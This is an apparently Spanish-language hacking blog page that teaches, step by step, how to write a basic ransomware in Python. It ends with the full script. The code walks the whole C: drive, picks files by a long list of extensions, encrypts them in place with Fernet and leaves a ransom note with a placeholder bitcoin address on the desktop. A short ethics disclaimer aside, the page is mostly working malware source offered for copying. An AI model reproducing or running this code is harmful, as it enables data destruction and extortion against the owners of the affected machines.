<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>H4ckdino - Blog</title>
  <meta name="title" content="H4ckdino - Blog">
  <meta name="description" content="Blog de hacking etico y material de estudio de informatica">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,  initial-scale=1.0">
  <meta name="author" content="H4ckdino">
  <meta name="keywords" content="Hacking, Redes, Ciberseguridad, Informatica, Red team, Programación">
  <meta property="og:title" content="H4ckdino - Blog de Hacking">
  <meta property="og:type" content="article">
  <meta property="og:image" content="https://images.pexels.com/photos/8721342/pexels-photo-8721342.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1">
  <meta property="og:url" content="https://y4chi.github.io">
  <meta property="og:description" content="¡Bienvenidos a H4ckdino, tu portal exclusivo hacia el fascinante mundo del hacking! Sumérgete en un universo de conocimientos cibernéticos, seguridad informática y tecnología punta. Descubre las últimas tendencias, trucos y herramientas que te convertirán en un maestro del ciberespacio. En H4ckdino, desentrañamos los misterios digitales y exploramos el lado audaz de la tecnología. ¡Únete a nuestra comunidad de mentes curiosas y desata tu potencial hacker!">
  <meta property="og:site_name" content="https://y4chi.github.io/ransomware-entendiendo-su-funcionamiento.html">
  <meta property="og:locale" content="es-PE">
  <meta name="twitter:title" content="H4ckdino - Blog de Hacking">
  <meta name="twitter:description" content="¡Bienvenidos a H4ckdino, tu portal exclusivo hacia el fascinante mundo del hacking! Sumérgete en un universo de conocimientos cibernéticos, seguridad informática y tecnología punta. Descubre las últimas tendencias, trucos y herramientas que te convertirán en un maestro del ciberespacio. En H4ckdino, desentrañamos los misterios digitales y exploramos el lado audaz de la tecnología. ¡Únete a nuestra comunidad de mentes curiosas y desata tu potencial hacker!">
  <meta name="twitter:image" content="https://images.pexels.com/photos/8721342/pexels-photo-8721342.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1">
  <meta name="twitter:site" content="https://y4chi.github.io">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="theme-color" content="#0B2447">

  <!-- 
    - primary meta tags
  -->
  <title>Wren - Perosonal Blog Website </title>
  <meta name="title" content="Wren - Perosonal Blog Website">
  <meta name="description" content="This is a blog html template made by codewithsadee">

  <!-- 
    - favicon
  -->
  <link rel="shortcut icon" href="./favicon.svg" type="image/svg+xml">

  <!-- 
    - google font link
  -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600;700;800&display=swap"
    rel="stylesheet">
  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
	<script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>


  <!--codigo sintax-->

  

  <!-- 
    - custom css link
  -->
  <link rel="stylesheet" href="../assets/css/style.css">
  <link rel="stylesheet" href="../assets/css/header.css">
  <link rel="stylesheet" href="../assets/css/contenedor.css">
  <link rel="stylesheet" href="../assets/css/footer.css">
  <link rel="stylesheet" type="text/css" href="../assets/css/codigo.css">


  <!-- 
    - preload images
  -->
  <link rel="preload" as="image" href="./assets/images/hero-banner.png">
  <link rel="preload" as="image" href="./assets/images/pattern-2.svg">
  <link rel="preload" as="image" href="./assets/images/pattern-3.svg">

</head>

<body id="top">

  <!-- 
    - #HEADER
  -->
  <header class="header">
		<div class="logo">
		<img class="logo1" src="./assets/images/logo/menor4.png" alt="">
		</div>
	
		<input type="checkbox" id="toggle">
		<label for="toggle"><img class="img2"  src="./assets/images/svg/menu.svg" alt="menu"></label>
	
	
		<nav class="navigation">
			<ul>
				<li><a href="../index.html"> INICIO </a></li>
				<li><a href="#"> SEGURIDAD INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
				<ul>
					<li><a href="../SECTON-HACKING-WIFI/index.html">HACKING WIFI</a></li>
					<li><a href="../SECTION-HACKING-WEB/index.html">HACKING WEB</a></li>
					<li><a href="../SECTION-MALWARE/index.html">MALWARE</a></li>
          <li><a href="../SECTION-BYPASS/index.html">BYPASS</a></li>
				</ul>
			</li>
      <li><a href="#"> INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
				<ul>
					<li><a href="../SECTION-LINUX/index.html">LINUX</a></li>
					<li><a href="../SECTION-PROGRAMACION/index.html">PROGRAMACIÓN</a></li>
					<li><a href="../SECTION-REDES/index.html">REDES</a></li>
				
				</ul>
			</li>
				<li><a href="">CTF <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
				<ul>
					<li><a href="../SECTION-HACKTHEBOX/index.html">HACKTHEBOX</a></li>
					
				
	
				</ul>
	
				</li>
				<li><a href="#"> ACERCA DE </a></li>
			
			
			
			</ul>
	
		</nav>

	</header>

  <main class="main-blog">

    <h1 id="h1-main">Ransomware: Entendiendo su Funcionamiento</h1>
    
    <h3 class="h3-importante">Introducción</h3>
    <p>
    En el mundo de la ciberseguridad, el ransomware ha emergido como una de las amenazas más prominentes y devastadoras de la última década. Este tipo de malware, que encripta los datos de las víctimas y exige un rescate para su liberación, ha causado estragos en empresas, organizaciones gubernamentales e incluso usuarios individuales en todo el mundo. En este artículo, exploraremos en profundidad el funcionamiento del ransomware, sus variantes más notorias y las medidas que podemos tomar para protegernos contra esta creciente amenaza cibernética.
    </p>

    <h3 class="h3-importante">Aviso Importante: Ética y Legalidad    </h3>
    <p>Antes de sumergirnos en el oscuro mundo del ransomware, es fundamental destacar la importancia de abordar este tema desde una perspectiva ética y legal. La realización de pruebas de penetración, investigación y cualquier actividad relacionada con la seguridad informática debe llevarse a cabo de manera responsable y legal.</p>

    <h3 class="h3-importante">Comenzando</h3>
    <p>Veremos el desarrollo de uno ransomware básico en python3</p>
    <p>Instalamos desde el CMD el paquete cryptography, es un paquete que proporciona recetas criptográficas y primitivas a los desarrolladores de Python:</p>
    <code class="code-command"> pip install cryptography</code>

    <p>De la biblioteca cryptography del módulo fernet importamos la clase Fernet. Fernet garantiza que un mensaje cifrado con él no puede ser manipulado o leído sin la llave. Fernet es una implementación de simétrico (también conocido como “clave secreta ” ) criptografía autenticada. Fernet también tiene soporte para implementar la rotación de claves a través de MultiFernet e importamos el módulo os que nos permite interactuar con el Sistema Operativo</p>
    <div class="code-container">
      <pre class="lenguage-python">
      <code>
    from cryptography.fernet import Fernet  
    import os
</code>
</pre>
</div>
      <button class="copy-button">Copiar</button>


<p>Especificamos el inicio del flujo de nuestro programa, declaramos la variable <code class="code-command"> directorio_inicial    </code> que contendrá la ruta raíz de nuestro sistema operativo luego declaramos la variable  <code class="code-command">  archivos   </code> que contendrá el retorno de la función   <code class="code-command"> recorrer_archivos_directorio()   </code>(esta función retorna la ruta de todos los archivos a cifrar)  </p>
<div class="code-container">
        <pre class="lenguage-python">
          <code>
    if __name__ == '__main__':
      directorio_inicial = "C:\\"
      archivos = recorrer_archivos_directorio(directorio_inicial)  
</code>
</pre>
</div>
<button class="copy-button">Copiar</button>


<p>Creación de la función <code class="code-command"> recorrer_archivos_directorio()   </code> primero creamos una lista vacía <code class="code-command"> archivos = []</code> que al estar definida fuera de la función se comporta como una variable global, cabe resaltar que se puede declarar en el flujo inicial del programa y luego en la función declararla como global <code class="code-command"> global archivosx</code>, pero en esta ocasión prefiero hacerlo así.</p>
<p>Declaramos la función y recibirá como parámetro una variable <code class="code-command">directorio    </code> creamos un bloque  <code class="code-command"> try except</code> dentro de <code class="code-command"> try:  </code> tenemos una variable   <code class="code-command">  elementos   </code> que contiene él lista de los directorios y archivos de la ruta <code class="code-command"> "C:\\" </code>, luego con un bucle <code class="code-command"> for   </code> recorremos los elementos de la variable <code class="code-command">elementos</code>, en la variable <code class="code-command"> ruta_elemento   </code> creamos una ruta tomando el valor de la variable <code class="code-command">    directorio  </code> más el valor de <code class="code-command"> elemento   </code> en la iteración, en la condición <code class="code-command">if os.path.isfile(ruta_elemento):</code> se comprueba si la ruta es un archivo, si lo es entra en la condición <code class="code-command"> _, extension = os.path.splitext(ruta_elemento)</code> lo que hace esta parte  del código es separar el nombre del archivo con la extensión y lo almacenamos en <code class="code-command">extension  </code>, luego en otra condición comprobamos si la extensión está dentro de la lista <code class="code-command">extensiones_permitidas </code> que más adelante crearemos y si se cumple la condición lo añadimos a la lista con <code class="code-command">archivos.append(ruta_elemento)</code>, pero si bloque <code class="code-command">if os.path.isfile(ruta_elemento)</code> no se cumple entramos en el bloque  <code class="code-command">elif os.path.isdir(ruta_elemento)</code> que válida si la ruta es un directorio si es así ingresa al bloque, luego comprobamos si el directorio no está en la lista de directorios excluidos con  <code class="code-command"> if ruta_elemento not in directorios_excluidos</code> si se cumple esta condición con un bloque <code class="code-command">try except </code> volvemos a llamar a la función <code class="code-command"> recorrer_archivos_directorio() </code> esto lo hacemos para hacer llamadas recursivas </p>
<div class="code-container">
<pre class="lenguage-python">
<code>
        archivos = []

        def recorrer_archivos_directorio(directorio):
            try:
                elementos = os.listdir(directorio)
        
                for elemento in elementos:
                    ruta_elemento = os.path.join(directorio, elemento)
        
                    if os.path.isfile(ruta_elemento):
                        _, extension = os.path.splitext(ruta_elemento)
                        if extension in extensiones_permitidas:
                            archivos.append(ruta_elemento)
        
                    elif os.path.isdir(ruta_elemento):
                        if ruta_elemento not in directorios_excluidos:
                            try:
                                recorrer_archivos_directorio(ruta_elemento)      
                            except TypeError:
                                pass
            except Exception as e:
                pass
  
</code>
</pre>
</div>
<button class="copy-button">Copiar</button>


<p>Creamos la lista con las extensiones permitidas:</p>

<div class="code-container">
  <pre class="lenguage-python">
  <code>
    extensiones_permitidas  = ['.bup', '.avi', '.apk', '.scala', '.tar.bz2', '.css', '.jsp',    
        '.pptx', '.backup', '.html', '.orig', '.jse', '.xlsx',
        '.sh', '.docx', '.jade', '.csh', '.obj', '.xml', '.pdf',
        '.ipa', '.db', '.lua', '.sqlite', '.txt', '.jpg', '.png',
        '.bash', '.tsv', '.gif', '.yml', '.tar.gz', '.md', '.perl',
        '.php', '.xls', '.scss', '.sql', '.tar', '.ps', '.go',
        '.old', '.zip', '.cpp', '.py', '.c', '.mp3', '.java', '.7z',
        '.jpeg', '.dbf', '.mp4', '.rdb', '.csv', '.ear', '.ogg',
        '.kt', '.rar', '.img', '.mdb', '.gz', '.svg', '.yaml', '.js',
        '.rb', '.bak', '.cnf', '.ts', '.pl', '.ods']
</code>
</pre>
</div>
<button class="copy-button">Copiar</button>

<p>Creamos una lista con los directorios no permitidos:</p>
<div class="code-container">
<pre class="lenguage-python">
<code>
    directorios_excluidos = [
        "C:\\Windows",
        "C:\\ProgramData",
        "C:\\Archivos de programa",
        "Archivos de programa (x86)",
        "PerfLogs",
        "C:\\Users\\Default"
    ]
</code>
</pre>
</div>
<button class="copy-button">Copiar</button>


<p>Creamos y llamamos la función <code class="code-command">generate_key()</code> la finalidad de esta función es crear un archivo key que servirá para cifrar el contenido, usamos la función generate_key de la clase Fernet y lo almacenamos en una variable key, luego lo guardamos en un archivo key.key</p>
<div class="code-container">
  <pre class="lenguage-python">
  <code>
    def generate_key():
        key = Fernet.generate_key()
        with open('key.key', 'wb') as key_file:
            key_file.write(key)

    def generate_key():
    </code>
  </pre>
</div>
  <button class="copy-button">Copiar</button>

<p>Creamos y llamamos la función <code class="code-command">retornar_key()</code> como el mismo nombre de la función lo dice esta función leerá el archivo que creamos y retornará el valor la cual será almacenada en la variable <code class="code-command"> key </code>  </p>
<div class="code-container">
  <pre class="lenguage-python">
  <code>
    def retornar_key():
      return open("key.key", 'rb').read()

    key = retornar_key()
    </code>
</pre>
</div>
  <button class="copy-button">Copiar</button>

<p>Ahora creamos la función <code class="code-command">encrypt()</code> esta función será la encargada de encriptar los archivos le pasaremos como argumentos los ítems que en este caso es la lista <code class="code-command"> archivos   </code> y como segundo argumento una <code class="code-command">  key  </code> la cual lo almacenaremos en la variable <code class="code-command">i</code> luego haciendo uso de un bucle for recorreremos ítem por item de <code class="code-command">items</code> luego con un bloque <code class="code-command"> try except</code> dentro de <code class="code-command">try:</code> leemos el archivo en modo binario y almacenamos el contenido en <code class="code-command">file_data </code> luego en la variable <code class="code-command">data </code> contendrá también el contenido de file_data, pero encriptada, creamos algunas excepciones, pero solo las pasamos por alto con la finalidad de no detener nuestro programa</p>

<div class="code-container">
  <pre class="lenguage-python">
  <code>
    def encrypt(items, key):
    i = Fernet(key)
    for item in items:
        try:
            with open(item, 'rb') as file:  
                file_data = file.read()

            data = i.encrypt(file_data)

            with open(item, 'wb') as file:
                file.write(data)
        except PermissionError as e:
            pass
        except Exception as e:
            pass


    encrypt(archivos,key)

  </code>
</pre>
</div>
<button class="copy-button">Copiar</button>

<p>Tomamos el nombre de usuario del sistema operativo y lo almacenamos en <code class="code-command">nombre_usuario</code>, creamos la ruta absoluta hacia el Desktop del sistema de archivos y lo almacenamos en la variable <code class="code-command">path</code>  la finalidad de la variable path es definir la ruta donde se almacenará el archivo  <code class="code-command">readme.txt</code> con contenido similar al rescate que piden los ciberdelincuentes</p>

<div class="code-container">
  <pre class="lenguage-python">
  <code>
    nombre_usuario = os.getlogin()
    path="C:\\Users\\" + nombre_usuario + "\\Desktop"
    with open(path+"\\"+"readme.txt", 'w') as file:
        file.write("Dirección de mi BTC: xxxx-xxxx-xxxx-xxxx-xxxx-xxx-xxxx")
  </code>
</pre>
</div>
<button class="copy-button">Copiar</button>

<p>Finalmente todo nuestro código quedaría así:</p>

<div class="code-container">
  <pre class="lenguage-python">
  <code>
    from cryptography.fernet import Fernet
    import os
    
    directorios_excluidos = [
        "C:\\Windows",
        "C:\\ProgramData",
        "C:\\Archivos de programa",
        "Archivos de programa (x86)",
        "PerfLogs",
        "C:\\Users\\Default"
    ]
    
    extensiones_permitidas  = ['.bup', '.avi', '.apk', '.scala', '.tar.bz2', '.css', '.jsp',
                  '.pptx', '.backup', '.html', '.orig', '.jse', '.xlsx',
                  '.sh', '.docx', '.jade', '.csh', '.obj', '.xml', '.pdf',
                  '.ipa', '.db', '.lua', '.sqlite', '.txt', '.jpg', '.png',
                  '.bash', '.tsv', '.gif', '.yml', '.tar.gz', '.md', '.perl',
                  '.php', '.xls', '.scss', '.sql', '.tar', '.ps', '.go',
                  '.old', '.zip', '.cpp', '.py', '.c', '.mp3', '.java', '.7z',
                  '.jpeg', '.dbf', '.mp4', '.rdb', '.csv', '.ear', '.ogg',
                  '.kt', '.rar', '.img', '.mdb', '.gz', '.svg', '.yaml', '.js',
                  '.rb', '.bak', '.cnf', '.ts', '.pl', '.ods']
    
    
    archivos = []
    
    def recorrer_archivos_directorio(directorio):
        try:
            elementos = os.listdir(directorio)
    
            for elemento in elementos:
                ruta_elemento = os.path.join(directorio, elemento)
    
                if os.path.isfile(ruta_elemento):
                    _, extension = os.path.splitext(ruta_elemento)
                    if extension in extensiones_permitidas:
                        archivos.append(ruta_elemento)
    
                elif os.path.isdir(ruta_elemento):
                    if ruta_elemento not in directorios_excluidos:
                        try:
                            recorrer_archivos_directorio(ruta_elemento)
                        except TypeError:
                            pass
        except Exception as e:
            pass
        
        return archivos
    
    
    def generate_key():
        key = Fernet.generate_key()
        with open('key.key', 'wb') as key_file:
            key_file.write(key)
        
    def retornar_key():
        return open("key.key", 'rb').read()
        
        
    
    
    def encrypt(items, key):
        i = Fernet(key)
        for item in items:
            try:
                with open(item, 'rb') as file:
                    file_data = file.read()
    
                data = i.encrypt(file_data)
    
                with open(item, 'wb') as file:
                    file.write(data)
            except PermissionError as e:
                pass
            except Exception as e:
                pass
    
    
    
    if __name__ == '__main__':
        directorio_inicial = "C:\\"
        archivos =recorrer_archivos_directorio(directorio_inicial)
        
    generate_key()
    key = retornar_key()
    encrypt(archivos,key)
    
    
    nombre_usuario = os.getlogin()
    path="C:\\Users\\" + nombre_usuario + "\\Desktop"
    with open(path+"\\"+"readme.txt", 'w') as file:
        file.write("Dirección de mi BTC: xxxx-xxxx-xxxx-xxxx-xxxx-xxx-xxxx")
  </code>
</pre>
</div>
<button class="copy-button">Copiar</button>


  <br><br>
</main>





  <!-- 
    - #BACK TO TOP
  -->
  <footer class="footer"> 
    <div class="izquierda">  
  
      <a href="#" id="footer-a"><a href="#">
        <img src="../assets/images/logo/menorH.png" alt="logo h4ckdino">
      </a>  © 2023 h4ckdino, Inc. </a>
      <a href="#" id="footer-a">Ponte en contacto con nosotros</a>
      <a href="#" id="footer-a" >Configuración de cookies</a>
      <a href="#" id="footer-a" >Politica de privacidad</a>
      
  
      
    </div>
  </footer>
  





  <!-- 
    - custom js link
  -->

  <!-- 
    - ionicon link
  -->
  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>

  <script src="../assets/js/copiar-boton.js"></script>
  <script src="./assets/js/script.js"></script>


</body>

</html>